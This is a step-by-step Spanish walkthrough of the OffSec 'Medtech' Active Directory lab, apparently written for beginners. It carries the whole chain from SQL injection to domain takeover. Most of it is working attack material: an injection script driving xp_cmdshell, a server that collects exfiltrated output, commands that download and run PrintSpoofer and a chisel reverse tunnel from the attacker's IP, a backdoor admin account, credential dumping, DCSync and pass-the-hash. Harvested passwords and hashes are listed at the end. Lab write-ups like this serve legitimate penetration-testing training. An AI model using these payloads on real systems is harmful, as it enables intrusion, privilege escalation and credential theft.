# MEDTECH — Walkthrough completo (para noobs, paso a paso)

> Lab OffSec "Medtech" (Active Directory). Objetivo: **compromiso total del dominio** y todas las proof flags.
> Red pública `192.168.187.0/24`, interna `172.16.187.0/24`. Atacante = Kali con VPN (`tun0`, p.ej. `192.168.45.190`).
>
> **Cadena en una línea:** SQLi en WEB02 → MSSQL `xp_cmdshell` (RCE) → **PrintSpoofer** (SeImpersonate→SYSTEM) → credenciales (`joe:Flowers1`) → pivot **chisel** → joe admin en FILES02 y **en Backup Operators del dominio** → dump de `DC01$` → **DCSync** → todos los hashes → PtH a todo.

---

## 0. Topología y variables

| Rol | Host | IP | Puertos |
|---|---|---|---|
| Web público | **WEB02** | 192.168.187.121 | 80, 445, 5985 (+172.16.187.254 interno) |
| DC | **DC01** | 172.16.187.10 | 53,88,389,445,5985 |
| File server | **FILES02** | 172.16.187.11 | 445, 3306, 5985 |
| Dev | **DEV04** | 172.16.187.12 | 445, 3306(XAMPP), 5985 |
| Prod | **PROD01** | 172.16.187.13 | 445, 5985 |
| Workstation | **CLIENT01** | 172.16.187.82 | 445, 5985 |
| Workstation | **CLIENT02** | 172.16.187.83 | 445, 5985 |

```bash
LHOST=192.168.45.190        # tu IP de la VPN: ip -o addr show tun0
WEB02=192.168.187.121
DC=172.16.187.10; FILES02=172.16.187.11; DEV04=172.16.187.12
PROD01=172.16.187.13; CLIENT01=172.16.187.82; CLIENT02=172.16.187.83
```

> **Truco zsh**: pon los flags de `curl`/`ssh` **literales** (no dentro de una `$VAR`) o no se separan en palabras. Y `${VAR}:role`, nunca `$VAR:role` (zsh interpreta `:r`).

---

## 0.1 Las herramientas (qué es cada cosa)

- **nxc** = **NetExec** (antes CrackMapExec / `crackmapexec`). La navaja suiza para Windows/AD: con un
  usuario+clave (o hash) prueba acceso y ejecuta acciones por **SMB, WinRM, LDAP, MSSQL, SSH**, etc.
  Forma típica: `nxc <protocolo> <ip> -u <user> -p <pass> [opciones]`.
  - `(Pwn3d!)` en la salida = **tienes admin** en esa máquina por ese protocolo.
  - `--local-auth` = autenticar como cuenta **local** (no del dominio).
  - `-H <hash>` = autenticar con **hash NTLM** en vez de contraseña (**Pass-the-Hash**).
  - `-x 'cmd'` / `-X 'powershell'` = ejecutar un comando en el objetivo.
  - `--sam --lsa` = volcar credenciales locales. `-M <modulo>` = módulo (p.ej. `backup_operator`).
- **evil-winrm** = shell interactiva por WinRM (puerto 5985). Alternativa a `nxc winrm`.
- **impacket-secretsdump** = volca hashes (SAM/LSA o del dominio vía **DCSync**).
- **proxychains4** = hace que CUALQUIER herramienta (nmap, nxc, impacket…) salga por un **proxy SOCKS**
  (nuestro túnel). Lee la config de `pc.conf`.
- **chisel** = crea el túnel: un `server` en tu Kali y un `client` en la víctima; monta un **SOCKS**
  por el que entras a la red interna.
- **PrintSpoofer / GodPotato** = abusan de `SeImpersonatePrivilege` para pasar de cuenta de servicio a **SYSTEM**.
- **hashcat** = crackear hashes offline con diccionario (rockyou).

---

## 1. Recon

```bash
nmap -Pn -sT -n --open -p 80,135,139,445,1433,3389,5985,8443 192.168.187.120 192.168.187.121 192.168.187.122
nxc smb 192.168.187.120 192.168.187.121 192.168.187.122     # hostnames + dominio
```

→ **.121 = WEB02** (IIS/ASP.NET, sitio "MedTech"), dominio `medtech.com`.

```bash
curl -s http://$WEB02/ | grep -ioE 'href="[^"]+\.aspx"'     # login.aspx, blog.aspx, ...
```

---

## 2. SQL Injection en el login (MSSQL)

El login es `POST /login.aspx` con `UsernameTextBox`/`PasswordTextBox` y tokens ASP.NET
(`__VIEWSTATE`, `__EVENTVALIDATION`) que hay que **releer frescos en cada POST**.

Señal de SQLi (diferencia de errores): un `'` en el usuario devuelve *"An error occurred"* (error SQL),
mientras un usuario normal da *"Invalid username or password"*.

Script que maneja los tokens — `inj.py`:

```python
import requests, re, time, base64
U="http://192.168.187.121/login.aspx"
def tokens(s):
    r=s.get(U,timeout=15)
    def g(n):
        m=re.search(r'id="%s" value="([^"]*)"'%n,r.text); return m.group(1) if m else ''
    return g('__VIEWSTATE'),g('__VIEWSTATEGENERATOR'),g('__EVENTVALIDATION')
def inject(user,pwd='x',timeout=60):
    s=requests.Session(); vs,vg,ev=tokens(s)
    data={'__VIEWSTATE':vs,'__VIEWSTATEGENERATOR':vg,'__EVENTVALIDATION':ev,
          'ctl00$ContentPlaceHolder1$UsernameTextBox':user,
          'ctl00$ContentPlaceHolder1$PasswordTextBox':pwd,
          'ctl00$ContentPlaceHolder1$LoginButton':'Login'}
    t=time.time(); r=s.post(U,data=data,timeout=timeout,allow_redirects=False)
    return time.time()-t, r.status_code, len(r.text)
def psrun(ps,timeout=60):   # lanza PowerShell via xp_cmdshell (base64 = sin líos de comillas)
    b=base64.b64encode(ps.encode('utf-16-le')).decode()
    inject("admin'; EXEC xp_cmdshell 'powershell -nop -w hidden -enc %s';-- -"%b, timeout=timeout)
```

Confirmar **consultas apiladas** (debe tardar ~6s):

```python
import inj; print(inj.inject("admin'; WAITFOR DELAY '0:0:6'-- -"))
```

---

## 3. SQLi → RCE con xp_cmdshell

MSSQL deja habilitar `xp_cmdshell` y ejecutar comandos (como la cuenta de servicio del SQL):

```sql
'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;
   EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;-- -
```

Como el output no vuelve por la web, exfiltramos por HTTP. Servidor que **sirve ficheros y captura POST** — `srv.py`:

```python
import os
from http.server import SimpleHTTPRequestHandler, HTTPServer
os.chdir('/tmp/work')                      # carpeta con tus binarios (PrintSpoofer64.exe, chisel.exe)
class H(SimpleHTTPRequestHandler):
    def do_POST(self):
        l=int(self.headers.get('Content-Length','0') or 0)
        open('exfil.log','ab').write(self.rfile.read(l)+b'\n')
        self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
    def log_message(self,*a): pass
HTTPServer(('0.0.0.0',8000),H).serve_forever()
```

Prueba de ejecución:

```python
import inj
inj.psrun("$o='CB '+(whoami); iwr http://192.168.45.190:8000/cb -Method POST -Body $o -UseBasicParsing")
# exfil.log -> "CB nt service\mssql$sqlexpress"   (cuenta de servicio = tiene SeImpersonatePrivilege)
```

---

## 4. Privesc: PrintSpoofer (SeImpersonate → SYSTEM) + admin local

WEB02 es **dual-homed** (`192.168.187.121` + `172.16.187.254`) → será el pivot.

```python
import inj
L="192.168.45.190"
# descarga PrintSpoofer y confirma SeImpersonate
inj.psrun(f"iwr http://{L}:8000/PrintSpoofer64.exe -OutFile C:\\Windows\\Temp\\ps.exe -UseBasicParsing;"
          f"$o=cmd /c whoami /priv|Out-String; iwr http://{L}:8000/cb -Method POST -Body $o -UseBasicParsing")

# crea admin local (una llamada por vez: PrintSpoofer usa un named pipe)
inj.psrun('C:\\Windows\\Temp\\ps.exe -c "cmd /c net user pwn Pwn123!@# /add"')
inj.psrun('C:\\Windows\\Temp\\ps.exe -c "cmd /c net localgroup administrators pwn /add"')
# habilita login remoto de admins locales (UAC remote token filtering)
inj.psrun('C:\\Windows\\Temp\\ps.exe -c "cmd /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"')
```

```bash
nxc winrm 192.168.187.121 -u pwn -p 'Pwn123!@#' --local-auth     # -> (Pwn3d!) shell estable
```

---

## 5. Loot en WEB02 → credencial de dominio

```bash
# FLAG WEB02
nxc winrm 192.168.187.121 -u pwn -p 'Pwn123!@#' --local-auth -X 'Get-Content C:\Users\Administrator\Desktop\proof.txt'
# volcado SAM + LSA
nxc smb 192.168.187.121 -u pwn -p 'Pwn123!@#' --local-auth --sam --lsa
```

En LSA secrets aparece **`medtech.com\joe : Flowers1`** (y en `C:\inetpub\wwwroot\web.config`, `sa:WhileChirpTuesday218`).

---

## 6. Pivot a la interna con chisel (SOCKS) — EXPLICADO

### ¿Qué es un "pivot" y por qué lo necesito?
Tu Kali llega a `192.168.187.0/24` (la red pública) pero **NO** a `172.16.187.0/24` (la interna,
donde están DC01, FILES02, etc.): no tienes ruta hasta ahí. Pero **WEB02 sí** llega a ambas
(tiene dos tarjetas de red: `192.168.187.121` y `172.16.187.254`). La idea del pivot es:
*usar WEB02 como "puente"* para que tu tráfico entre a la interna a través de él.

Lo hacemos con un **proxy SOCKS**: montamos un túnel entre tu Kali y WEB02, y luego cualquier
herramienta que mandemos "por el túnel" (con `proxychains`) sale desde WEB02 y alcanza la interna.

```
  TU KALI ───(internet/VPN)──▶ WEB02 (192.168.187.121)
   │                             │  también está en 172.16.187.254
   │   túnel chisel (SOCKS)      ▼
   └────────────────────────▶ 172.16.187.0/24  (DC01, FILES02, DEV04, PROD01, CLIENT01/02)
```

### Paso 6.1 — Conseguir los binarios de chisel
chisel tiene dos partes: un **server** (corre en TU Kali) y un **client** (corre en WEB02).
Como WEB02 es Windows, necesitas el `.exe`; para tu Kali, el de Linux.

```bash
mkdir -p /tmp/work && cd /tmp/work
curl -sL -o chisel_linux.gz https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz
curl -sL -o chisel.exe.gz   https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_windows_amd64.gz
gunzip chisel_linux.gz chisel.exe.gz          # descomprime
chmod +x chisel_linux
```
(`chisel.exe` tiene que estar en `/tmp/work`, que es la carpeta que sirve `srv.py` por HTTP en el :8000.)

### Paso 6.2 — Arrancar el SERVER en tu Kali
```bash
./chisel_linux server --reverse --port 9001 --socks5
```
- `--reverse` = permite que el cliente (WEB02) te pida abrir un SOCKS (conexión "inversa": es WEB02
  quien te llama a ti, cómodo porque WEB02 sí tiene salida hacia tu IP).
- `--port 9001` = puerto donde WEB02 se conectará a ti.
- Cuando el cliente conecte, **se abre un SOCKS en `127.0.0.1:1080` en tu Kali**. Ése es el que usarás.
- Déjalo corriendo (en otra pestaña, o en segundo plano).

### Paso 6.3 — Subir y lanzar el CLIENT en WEB02
Primero súbelo (WEB02 lo baja de tu `srv.py`), luego ejecútalo apuntando a tu server.
**Importante:** lánzalo como **tarea programada**; si lo lanzas con `Start-Process` desde WinRM,
el proceso muere en cuanto se cierra la sesión WinRM y el túnel se cae.

```bash
nxc winrm 192.168.187.121 -u pwn -p 'Pwn123!@#' --local-auth \
  -X "iwr http://192.168.45.190:8000/chisel.exe -OutFile C:\Windows\Temp\c.exe -UseBasicParsing; \
      schtasks /create /tn chk /tr 'C:\Windows\Temp\c.exe client 192.168.45.190:9001 R:socks' /sc once /st 00:00 /ru SYSTEM /f; \
      schtasks /run /tn chk"
```
Desglose del lado cliente: `c.exe client 192.168.45.190:9001 R:socks`
- `client 192.168.45.190:9001` = conéctate a mi server chisel.
- `R:socks` = "reverse SOCKS": abre el SOCKS **en el server** (mi Kali, 127.0.0.1:1080).

### Paso 6.4 — Comprobar que el túnel está arriba
```bash
ss -ltn | grep 1080            # en tu Kali: debe aparecer 127.0.0.1:1080 LISTEN
```

### Paso 6.5 — Enrutar tus herramientas por el túnel (proxychains)
Crea `pc.conf`:
```
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080
```
Y antepón `proxychains4 -q -f pc.conf` a cualquier comando para que salga por WEB02:
```bash
# prueba: ahora SÍ llegas al DC interno
proxychains4 -q -f pc.conf nxc smb 172.16.187.10 -u joe -p 'Flowers1' -d medtech.com
```
Si eso responde con el nombre `DC01`, el pivot funciona y ya puedes atacar toda la interna.

> Notas: proxychains solo tuneliza TCP. Para que la resolución DNS también vaya por el túnel usa
> `proxy_dns` y, en herramientas como bloodhound-python, añade `--dns-tcp -ns <IP_del_DC>`.
> El escaneo con `nmap` por proxychains debe ser **connect scan** (`-sT -Pn`), nunca `-sS`.

---

## 7. Recon interno + lateral a FILES02

```bash
for ip in $DC $FILES02 $DEV04 $PROD01 $CLIENT01 $CLIENT02; do
  proxychains4 -q -f pc.conf nxc smb $ip -u joe -p 'Flowers1' -d medtech.com
done
```

→ `joe` es válido en todos y **admin en FILES02 (Pwn3d!)**.

```bash
# FLAGS FILES02
proxychains4 -q -f pc.conf nxc winrm $FILES02 -u joe -p 'Flowers1' -d medtech.com \
  -X "Get-ChildItem C:\Users -Recurse -Include proof.txt,local.txt -EA SilentlyContinue | %{\$_.FullName; Get-Content \$_.FullName}"
# volcado -> hashes DCC2 de yoshi/wario (cacheados)
proxychains4 -q -f pc.conf nxc smb $FILES02 -u joe -p 'Flowers1' -d medtech.com --sam --lsa
```

Crackea los DCC2 (opcional, da `yoshi/wario : Mushroom!`):
```bash
hashcat -m 2100 '$DCC2$10240#yoshi#<hash>' /usr/share/wordlists/rockyou.txt
```

---

## 8. El atajo: joe está en BACKUP OPERATORS → dump del DC

BloodHound/consulta de grupos revela que **joe pertenece a Backup Operators del dominio** y que
**Domain Admins = leon + Administrator**.

```bash
# recoger datos con BloodHound (DNS por TCP a través del SOCKS)
proxychains4 -q -f pc.conf bloodhound-python -u joe -p 'Flowers1' -d medtech.com -ns $DC --dns-tcp -c DCOnly --zip
```

Backup Operators tiene **SeBackupPrivilege** sobre el DC → se puede volcar NTDS. NetExec lo automatiza:

```bash
proxychains4 -q -f pc.conf nxc smb $DC -u joe -p 'Flowers1' -d medtech.com -M backup_operator
```

Esto saca SAM/SYSTEM/SECURITY del DC y, clave, el **hash de la cuenta de máquina `DC01$`**:
```
DC01$ ... :3ff12325a80240c7cae1f04618b0016f
```

---

## 9. DCSync con DC01$ → todo el dominio

Un **controlador de dominio** tiene derechos de replicación → con su hash hacemos DCSync:

```bash
proxychains4 -q -f pc.conf impacket-secretsdump -hashes ':3ff12325a80240c7cae1f04618b0016f' \
  'medtech.com/DC01$@172.16.187.10' -just-dc-ntlm
```

Sale todo: **Administrator**, **leon (Domain Admin)**, **krbtgt** (golden ticket), y las cuentas de máquina.

---

## 10. Cosechar todas las flags con Pass-the-Hash

Con el hash del **Administrator de dominio** (`...:c33b5cf9fa1b1bb4894d4a6cd7c54034`) entras a todo:

```bash
AH='aad3b435b51404eeaad3b435b51404ee:c33b5cf9fa1b1bb4894d4a6cd7c54034'
for ip in $DC $DEV04 $PROD01 $CLIENT01 $CLIENT02; do
  proxychains4 -q -f pc.conf nxc winrm $ip -u Administrator -H "$AH" -d medtech.com \
    -X "Get-ChildItem C:\Users -Recurse -Include proof.txt,local.txt -EA SilentlyContinue | %{\$_.FullName; Get-Content \$_.FullName}"
done
```

---

## 11. Flags (valores de esta sesión)

| Host | proof | local |
|---|---|---|
| WEB02 (192.168.187.121) | `b53941fb7b606da2e60178a21beb270c` | — |
| FILES02 (172.16.187.11) | `ea010a95c640eaf19656534831f9d939` | `185e2f54147ebfb9f52007ac28b66b94` |
| DC01 (172.16.187.10) | `6b50f8a690d883c3c58cfd58e1b83547` | — |
| DEV04 (172.16.187.12) | `1aeab863ae4232fde89a10e8d2d02ba4` | `5b9e7b805aa82b315fc20b8c0c239ea9` |
| PROD01 (172.16.187.13) | `7e65a80013eef21d25546914589ca2f0` | — |
| CLIENT01 (172.16.187.82) | `708392bec59094507a0f9bc4e2e31765` | — |
| CLIENT02 (172.16.187.83) | `1cba6f3100df8649b3cb7c04ca902e44` | `1c6321bb2fea72e66edb84ea2521d064` |

**Credenciales recogidas:** `joe:Flowers1` · `yoshi/wario:Mushroom!` · `leon:rabbit:)` (DA) · `peach:princess0011` · `mario:luigi12` · `offsec:lab` · `sa:WhileChirpTuesday218` · `cloudbase-init:r6pJrrhf1fCwVMeqC2yG` · hashes de todo el dominio (incl. krbtgt).

---

## 12. Máquinas Linux del pod (standalone)

Además del AD, el pod tiene 3 Linux **separadas** (no salen en la narrativa Medtech):

| IP | Servicio | Nota |
|---|---|---|
| 192.168.187.120 | SSH + WEBrick/Jekyll ("PWK Awesome Website") | web estática, sin vuln evidente |
| 192.168.187.122 | SSH + OpenVPN (1194) | probable gateway VPN |
| 172.16.187.14 | SSH (interno) | — |

Ninguna acepta las credenciales del dominio por SSH y no están unidas al AD → su **credencial inicial
viene en el texto del ejercicio de esa máquina** (cajas standalone de OffSec), no en Medtech.

---

## 13. Gotchas que ahorran horas

- `--local-auth` para cuentas locales (`pwn`); sin él nxc prueba `dominio\usuario` y falla.
- Admin local no entra por red hasta poner `LocalAccountTokenFilterPolicy=1`.
- Comillas anidadas en `nxc -X` → usa `powershell -enc <base64>`.
- chisel en la víctima: lánzalo como **tarea programada**, no con `Start-Process` (muere al cerrar WinRM).
- BloodHound por SOCKS necesita `--dns-tcp -ns <DC>`.
- DCSync funciona con el hash de **cualquier cuenta de máquina de DC** (`DC01$`), no hace falta un DA.
